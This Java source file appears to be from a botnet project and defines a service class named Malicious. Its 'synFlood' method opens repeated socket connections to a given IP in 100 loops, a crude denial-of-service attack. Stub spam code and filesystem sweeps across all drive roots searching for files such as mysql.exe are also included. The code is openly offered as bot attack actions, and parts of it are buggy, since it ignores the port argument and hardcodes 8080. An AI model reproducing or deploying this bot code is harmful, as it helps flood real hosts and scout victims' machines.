package cs.sii.bot.action;

import java.io.File;
import java.io.IOException;
import java.net.Socket;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;

import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

@Service
public class Malicious {


	/**
	 * @param msg
	 */
	public void synFlood(String msg) {

		System.out.println("synflood  " + msg);

	}
	
	/**
	 * @param ip_address
	 * @param port
	 * @param time
	 */
	public void synFlood(String ip_address,int port,int time) {
		System.out.println("Attack  ");
		//Il numero 100 indica i processi in parallelo
		for(int i=0;i<100;i++)
	        createSocket(ip_address, port,time);
	    }

	/**
	 * @param msg
	 */
	public void spam(String msg) {

		System.out.println("spam  " + msg);

	}

	/**
	 * @param folder
	 */
	@SuppressWarnings("unused")
	private void listFilesForFolder(final File folder) {
		if (folder.listFiles() != null)
			for (final File fileEntry : folder.listFiles()) {
				if (fileEntry.isDirectory()) {
					listFilesForFolder(fileEntry);
				} else {
					System.out.println(fileEntry.getName());
				}
			}
	}

	public String checklistFilesFolder(final String folderStart, String fileCheck) {
		final File folder = new File(folderStart);
		System.out.println("starto da " + folder.listFiles().length);
		if (folder.listFiles() != null)
			System.out.println("super starto da " + folder);
		for (final File fileEntry : folder.listFiles()) {
			System.out.println("file " + fileEntry.getAbsolutePath());
			if (fileEntry.isDirectory()) {
				if (!checklistFilesForFolder(fileEntry, fileCheck).equals(""))
					return checklistFilesForFolder(fileEntry, fileCheck);
			} else {
				if (fileEntry.getName().matches(fileCheck)) {
					return fileEntry.getAbsolutePath();
				}
			}
		}
		return "";
	}

	/**
	 * @param folder
	 * @param fileCheck
	 * @return
	 */
	private String checklistFilesForFolder(final File folder, String fileCheck) {
		if (folder.listFiles() != null)
			for (final File fileEntry : folder.listFiles()) {
				if (fileEntry.isDirectory()) {
					if (!checklistFilesForFolder(fileEntry, fileCheck).equals(""))
						return checklistFilesForFolder(fileEntry, fileCheck);
				} else {
					if (fileEntry.getName().matches(fileCheck)) {
						return fileEntry.getAbsolutePath();
					}
				}
			}
		return "";
	}

	/**
	 * @param folder
	 * @param fileCheck
	 *            "(^mysql.exe)"
	 * @return
	 */
	public String checklistFiles(String fileCheck) {
		File[] paths;
		// returns pathnames for files and directory
		paths = File.listRoots();
		// for each pathname in pathname array
		for (File path : paths) {

			final File folder = new File(path.toString());
			List<String> folders = Arrays.asList(folder.list());
			for (String b : folders) {
				try {
					final File folder2real = new File(path.toString() + b);
					String s = checklistFilesForFolder(folder2real, fileCheck);
					if (!s.equals("")) {
						return s;
					}
				} catch (Exception e) {
					System.out.println("no index");
				}

			}
		}
		return "";
	}

	
	

	
		@Async 
		private void createSocket(String ip,int port,int time){
                  try {
                	  int i=0;
                	  while(i<time){
                		  Socket socket=new Socket(ip,8080);
                		  i++;
                	  }             	  
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

	}
	
	
	
	
	
	
	
}
